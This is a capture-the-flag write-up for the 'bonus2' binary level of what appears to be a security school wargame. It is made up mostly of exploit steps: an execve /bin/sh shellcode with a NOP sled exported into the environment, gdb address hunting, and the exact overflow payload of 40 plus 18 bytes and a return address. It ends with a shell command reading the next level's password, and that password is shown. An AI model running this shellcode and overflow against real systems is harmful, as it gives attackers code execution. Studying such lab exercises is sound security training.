### Download binary
``scp -P4242 bonus2@192.168.31.170:/home/user/bonus2/bonus2 ~/Desktop/``

----

### Decompilation with ghidra
We disasemble the main, to search for a breach.

----

### Main function analysis (see sources)

The main is quite complex, but after analysis the exploit is quite simple. We need to implement an adress to our shellcode after an overflow in the 2nd arg. We will put our shellcode in the environement because it is more convenient for us.

The payload that we will build is like this :

**40 char of junk, 18 char to overflow then the adress of our shellcode**

----

### Building the payload

First we export our shellcode
``export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')``

After that we need to find the adress to our shellcode.

``(gdb) disas main``
>Dump of assembler code for function main:
>[...]

``(gdb) x/100s &0xbffff884``
>[...]
>"SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211\302\260\v\315\200\061\300@\315\200"

By measure of safety, we will point in the middle of our NOP instruction, not at the start.

Now we got everything we need, our final payload will be :
``$(python -c "print 'A' * 40") $(python -c "print 'B' * 18 + '\x94\xf8\xff\xbf'")``

After some tries, we see that we need to set the **LANG** in env to **fi**:
``EXPORT LANG=fi``

----

#### Getting the flag

``./bonus2 $(python -c "print 'A' * 40") $(python -c "print 'B' * 18 + '\x94\xf8\xff\xbf'")``
>Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����

``$ cat /home/user/bonus3/.pass``
>71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
